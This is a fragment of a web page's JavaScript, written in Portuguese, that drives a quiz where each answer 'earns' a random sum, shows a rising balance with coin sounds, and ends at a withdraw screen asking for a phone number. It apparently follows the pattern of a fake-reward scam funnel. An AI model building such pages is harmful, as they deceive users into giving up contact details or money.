  setTimeout(() => { etapa = "resultado"; render(); }, 3600);
}

// ══════════════════════════════════
//  RENDER
// ══════════════════════════════════
let isRendering = false;

function render() {
  if (isRendering) return;
  isRendering = true;

  const app = document.getElementById("app");
  updateTopBar();

  // LANDING
  if (etapa === "landing") {
    app.innerHTML = renderLanding();
    
    // Botão Seguir funcional
    const followBtn = document.getElementById("followBtn");
    if (followBtn) {
      followBtn.textContent = isFollowing ? "Seguindo" : "Seguir";
      if (isFollowing) followBtn.classList.add("following");
      followBtn.onclick = () => {
        isFollowing = !isFollowing;
        followBtn.textContent = isFollowing ? "Seguindo" : "Seguir";
        if (isFollowing) {
          followBtn.classList.add("following");
        } else {
          followBtn.classList.remove("following");
        }
      };
    }
    
    document.getElementById("startBtn").onclick = () => { etapa = "quiz"; render(); };
    isRendering = false; return;
  }

  // QUIZ
  if (etapa === "quiz") {
    app.innerHTML = renderQuiz();
    
    // Botão Seguir funcional no quiz
    const followBtnQuiz = document.getElementById("followBtnQuiz");
    if (followBtnQuiz) {
      followBtnQuiz.textContent = isFollowing ? "Seguindo" : "Seguir";
      if (isFollowing) followBtnQuiz.classList.add("following");
      followBtnQuiz.onclick = () => {
        isFollowing = !isFollowing;
        followBtnQuiz.textContent = isFollowing ? "Seguindo" : "Seguir";
        if (isFollowing) {
          followBtnQuiz.classList.add("following");
        } else {
          followBtnQuiz.classList.remove("following");
        }
      };
    }
    
    document.querySelectorAll(".opt-btn").forEach(btn => {
      btn.addEventListener("click", () => {
        const ganho     = valoresSorteados[indice];
        respostas.push(btn.dataset.ans);
        const novoSaldo = saldoAtual();
        updateTopBar();

        // Tocar som de moeda
        playMoneySound();

        // Mostrar modal centralizado
        document.body.insertAdjacentHTML("beforeend", renderModal(ganho, novoSaldo));

        document.getElementById("continueModalBtn").onclick = () => {
          document.getElementById("popupModal").remove();
          if (indice < perguntas.length - 1) {
            indice++;
            render();
          } else {
            etapa = "processing";
            render();
            iniciarProcessamento();
          }
        };
      });
    });
    isRendering = false; return;
  }

  // PROCESSING
  if (etapa === "processing") {
    app.innerHTML = renderProcessing();
    isRendering = false; return;
  }

  // RESULT
  if (etapa === "resultado") {
    app.innerHTML = renderResultado();
    updateTopBar();
    document.getElementById("withdrawBtn").onclick = () => { etapa = "levantamento"; render(); };
    isRendering = false; return;
  }

  // WITHDRAW
  if (etapa === "levantamento") {
    app.innerHTML = renderLevantamento();

    document.querySelectorAll(".method-card").forEach(m => {
      m.onclick = () => {
        metodo = m.dataset.method;
        document.querySelectorAll(".method-card").forEach(x => x.classList.remove("sel"));
        m.classList.add("sel");
      };
    });

    const inp = document.getElementById("phoneInput");
    if (inp) {
      inp.addEventListener("input", e => {
        telefone = e.target.value.replace(/\D/g,"").slice(0,9);
        e.target.value = telefone;
        const btn   = document.getElementById("payBtn");
        const valid = telefone.length === 9;
        if (btn) { btn.classList.toggle("on", valid); btn.disabled = !valid; }
      });
    }

    const payBtn = document.getElementById("payBtn");
    if (payBtn) {
      payBtn.onclick = () => {
        if (telefone.length === 9) showPayAnimation();
      };
    }

    isRendering = false; return;
  }

  // ERROR
  if (etapa === "erro") {
    app.innerHTML = renderErro();
    isRendering = false; return;
  }

  isRendering = false;
}

render();
</script>
</body>
